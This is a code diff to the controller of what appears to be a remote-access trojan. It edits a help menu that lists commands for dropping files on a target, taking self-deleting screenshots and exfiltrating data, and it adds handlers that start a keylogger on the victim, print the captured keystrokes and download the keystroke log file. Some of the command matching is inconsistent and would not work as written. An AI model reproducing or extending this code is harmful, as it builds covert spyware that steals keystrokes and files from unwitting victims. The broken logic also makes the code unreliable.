@@ -184,11 +184,11 @@ drop <file> (linux/windows)   :    To infiltrate file from C2 server to trgt
 
 screenshot OR   ss            :    To take screenshot and self destructs the screenshot from trgt
 
-keylogger on                  :    To start keylogger
+keylog on                     :    To start keylogger
 
 keylog dump                   :    To print keystrokes
 
-keylogger off                 :    To close keylogger and self destruct the logged file
+keylog off                    :    To close keylogger and self destruct the logged file
 ''', 'green'))
 			print(colored('''
 You can also use other commands related to networking, etc for linux as well as windows
@@ -279,6 +279,31 @@ You can also use other commands related to networking, etc for linux as well as 
 			trgt.settimeout(None)
 			file.close()
 			counter += 1
+
+
+                # keylogger on
+		elif cmd[:9] == 'keylog_on' and len(cmd) > 1:
+
+			result = recv_eff()
+			print(result)
+
+                # keylog dump
+		elif cmd[:11] == 'keylog_dump' and len(cmd) > 1:
+
+			result1 = recv_eff()
+			print(result1)
+
+			result2 = recv_eff()
+			print(result2)
+
+		# keylogger off and self destruct
+		elif cmd[:6] == 'keylog_off' and len(cmd) > 1:
+
+			result = recv_eff()
+			print(result)
+
+			download_file('key_log.txt')
+
 
 		# Exfiltration in trgt point of view  ✓
 		elif cmd[:4] == "take" and len(cmd) > 1:
